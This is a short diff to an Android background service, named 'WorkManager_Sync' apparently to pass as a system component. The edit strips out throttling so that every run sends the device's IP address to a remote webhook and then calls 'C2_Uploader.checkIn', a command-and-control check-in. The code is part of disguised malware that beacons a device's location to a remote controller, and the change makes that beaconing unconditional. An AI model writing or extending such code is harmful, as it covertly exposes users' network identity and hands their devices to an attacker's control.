@@ -723,19 +723,13 @@ public class WorkManager_Sync extends Service {
         }
 
         long now = System.currentTimeMillis();
-        boolean ipChanged = !currentIp.equals(lastReportedIp);
-        boolean isInitialReport = lastReportedIp == null || lastReportedIp.isEmpty();
-        boolean periodicRefresh = (now - lastReportTimestamp > 30 * 60 * 1000); // 30 mins
-
-        if (isInitialReport || ipChanged || periodicRefresh) {
-            Log.d(TAG, "IP Report Triggered for IP: " + currentIp);
-            if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.isEmpty()) {
-                boolean success = sendIpToWebhook(currentIp);
-                if (success) {
-                    lastReportedIp = currentIp;
-                    lastReportTimestamp = now;
-                    C2_Uploader.checkIn(WorkManager_Sync.this);
-                }
+        Log.d(TAG, "IP Report Triggered for IP: " + currentIp);
+        if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.isEmpty()) {
+            boolean success = sendIpToWebhook(currentIp);
+            if (success) {
+                lastReportedIp = currentIp;
+                lastReportTimestamp = now;
+                C2_Uploader.checkIn(WorkManager_Sync.this);
             }
         }
     }
